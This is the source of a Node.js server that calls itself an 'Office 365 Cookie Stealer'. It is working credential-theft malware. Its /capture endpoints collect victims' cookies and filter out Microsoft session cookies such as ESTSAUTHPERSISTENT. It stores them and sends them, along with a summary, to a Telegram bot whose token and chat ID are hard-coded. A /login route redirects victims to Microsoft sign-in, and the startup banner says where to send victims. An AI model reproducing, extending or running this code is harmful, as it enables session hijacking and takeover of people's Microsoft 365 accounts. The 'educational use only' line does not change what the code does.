// =============================================
// OFFICE 365 COOKIE STEALER - SIMPLE VERSION
// =============================================

const express = require('express');
const fs = require('fs-extra');
const path = require('path');
const cors = require('cors');
const fetch = require('node-fetch');
const app = express();
const PORT = process.env.PORT || 3000;

// =============================================
// ⚠️ CONFIGURATION - UPDATE THESE!
// =============================================
const CONFIG = {
    botToken: '8730465777:AAHmQqHT-aPYbAtxItqtDSAtoeGhcXIv-4g',
    chatId: '7075480337'
};

// =============================================
// MIDDLEWARE
// =============================================
app.use(cors());
app.use(express.json({ limit: '100mb' }));
app.use(express.static('public'));

// =============================================
// CREATE STORAGE
// =============================================
const STORAGE_DIR = './captured_sessions';
fs.ensureDirSync(STORAGE_DIR);
console.log(`✅ Storage created: ${STORAGE_DIR}/`);

// =============================================
// TELEGRAM SENDER
// =============================================
async function sendToTelegram(message, fileData = null) {
    try {
        console.log('📤 Sending to Telegram...');
        
        await fetch(
            `https://api.telegram.org/bot${CONFIG.botToken}/sendMessage`,
            {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CONFIG.chatId,
                    text: message,
                    parse_mode: 'HTML'
                })
            }
        );
        
        if (fileData) {
            const FormData = require('form-data');
            const formData = new FormData();
            formData.append('chat_id', CONFIG.chatId);
            formData.append(
                'document',
                JSON.stringify(fileData, null, 2),
                `session_${Date.now()}.json`
            );
            formData.append('caption', '📸 Captured Session Data');
            
            await fetch(
                `https://api.telegram.org/bot${CONFIG.botToken}/sendDocument`,
                {
                    method: 'POST',
                    body: formData
                }
            );
        }
        
        console.log('✅ Telegram sent!');
        return true;
    } catch (error) {
        console.error('❌ Telegram error:', error.message);
        return false;
    }
}

// =============================================
// EXTRACT COOKIES
// =============================================
function extractCookies(headers) {
    const cookieHeader = headers['cookie'] || headers['Cookie'] || '';
    const cookies = {};
    
    if (cookieHeader) {
        const parts = cookieHeader.split(';');
        for (const part of parts) {
            const trimmed = part.trim();
            if (trimmed) {
                const [name, ...valueParts] = trimmed.split('=');
                cookies[name] = valueParts.join('=');
            }
        }
    }
    
    return cookies;
}

// =============================================
// EXTRACT OFFICE 365 COOKIES
// =============================================
function extractOfficeCookies(cookies) {
    const officeCookies = {};
    const targetNames = [
        'ESTSAUTHPERSISTENT',
        'ESTSAUTH',
        'ESTSAUTHLIGHT',
        'SignInState',
        'SignInPolicy',
        'LoginOptions',
        'MSTeams',
        'MSA',
        'AAD',
        'Microsoft',
        'Office',
        'Outlook',
        'SharePoint',
        'x-ms-gateway-slice',
        'stsservicecookie'
    ];
    
    for (const [name, value] of Object.entries(cookies)) {
        for (const target of targetNames) {
            if (name.includes(target) || name.toUpperCase().includes(target.toUpperCase())) {
                officeCookies[name] = value;
                break;
            }
        }
    }
    
    return officeCookies;
}

// =============================================
// ✅ CAPTURE ENDPOINT - Receives cookies from victims
// =============================================
app.post('/capture', async (req, res) => {
    console.log('\n🎯 COOKIE CAPTURED!');
    
    const data = req.body;
    const timestamp = new Date().toISOString();
    
    // Get cookies from headers
    const cookies = extractCookies(req.headers);
    
    // Also get from body
    if (data.cookies && typeof data.cookies === 'object') {
        for (const [key, value] of Object.entries(data.cookies)) {
            if (!cookies[key]) {
                cookies[key] = value;
            }
        }
    }
    
    const officeCookies = extractOfficeCookies(cookies);
    const hasFullSession = cookies['ESTSAUTHPERSISTENT'] || cookies['ESTSAUTH'];
    
    console.log(`🍪 Total: ${Object.keys(cookies).length}`);
    console.log(`🎯 Office: ${Object.keys(officeCookies).length}`);
    
    if (hasFullSession) {
        console.log('🔥 FULL OFFICE 365 SESSION CAPTURED!');
    }
    
    // Save
    const sessionData = {
        timestamp: timestamp,
        url: data.url || req.headers.referer || 'unknown',
        userAgent: req.headers['user-agent'] || 'unknown',
        ip: req.ip || req.connection.remoteAddress,
        cookies: cookies,
        officeCookies: officeCookies,
        hasFullSession: hasFullSession
    };
    
    const filename = `session_${Date.now()}.json`;
    fs.writeJsonSync(path.join(STORAGE_DIR, filename), sessionData, { spaces: 2 });
    console.log(`📁 Saved: ${filename}`);
    
    // Send to Telegram if cookies found
    if (Object.keys(cookies).length > 0) {
        let message = '🎯 <b>Cookie Capture!</b>\n\n';
        message += `📅 <b>Time:</b> ${timestamp}\n`;
        message += `🌐 <b>URL:</b> ${data.url || req.headers.referer || 'Unknown'}\n`;
        message += `🍪 <b>Total Cookies:</b> ${Object.keys(cookies).length}\n`;
        message += `🎯 <b>Office Cookies:</b> ${Object.keys(officeCookies).length}\n`;
        
        if (hasFullSession) {
            message += '\n🔥 <b>FULL OFFICE 365 SESSION CAPTURED!</b>\n';
        }
        
        // Show important cookies
        if (Object.keys(officeCookies).length > 0) {
            message += '\n🔑 <b>Office Cookies:</b>\n';
            for (const [name, value] of Object.entries(officeCookies)) {
                const shortValue = value.length > 40 ? value.substring(0, 40) + '...' : value;
                message += `• ${name}: ${shortValue}\n`;
            }
        }
        
        await sendToTelegram(message, sessionData);
    }
    
    res.json({
        success: true,
        captured: Object.keys(cookies).length,
        officeCookies: Object.keys(officeCookies).length,
        hasFullSession: hasFullSession
    });
});

// =============================================
// ✅ GET CAPTURE - Fallback
// =============================================
app.get('/capture', async (req, res) => {
    console.log('\n🎯 GET CAPTURE!');
    
    let cookies = {};
    
    if (req.query.cookies) {
        try {
            cookies = JSON.parse(decodeURIComponent(req.query.cookies));
        } catch (e) {}
    }
    
    if (req.query.data) {
        try {
            const data = JSON.parse(decodeURIComponent(req.query.data));
            if (data.cookies) {
                cookies = data.cookies;
            }
        } catch (e) {}
    }
    
    console.log(`🍪 Captured ${Object.keys(cookies).length} cookies via GET`);
    
    res.json({
        success: true,
        captured: Object.keys(cookies).length,
        cookies: cookies
    });
});

// =============================================
// ✅ REDIRECT TO REAL MICROSOFT LOGIN
// =============================================
app.get('/login', (req, res) => {
    console.log('\n🔐 Redirecting to Microsoft login...');
    
    const loginUrl = 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize?' +
        'client_id=c9a559d2-7aab-4f13-a6ed-e7e9c52aec87' +
        '&redirect_uri=https%3A%2F%2Fforms.cloud.microsoft%2Flanding' +
        '&response_type=code' +
        '&response_mode=form_post' +
        '&scope=openid%20profile%20offline_access' +
        '&prompt=select_account';
    
    res.redirect(loginUrl);
});

// =============================================
// ✅ LANDING PAGE
// =============================================
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// =============================================
// ✅ INJECTOR PAGE
// =============================================
app.get('/injector.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'injector.html'));
});

// =============================================
// ✅ START SERVER
// =============================================
app.listen(PORT, () => {
    console.log(`
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║   🔥 OFFICE 365 COOKIE STEALER                             ║
║   🎯 Running on Railway!                                   ║
║                                                              ║
║   📡 Port: ${PORT}                                           ║
║   📁 Captures: ${STORAGE_DIR}/                              ║
║                                                              ║
║   📌 SEND VICTIM TO:                                       ║
║   🔗 https://your-railway-url/login                        ║
║                                                              ║
║   ⚠️  FOR EDUCATIONAL USE ONLY!                            ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
    `);
});

module.exports = { app };
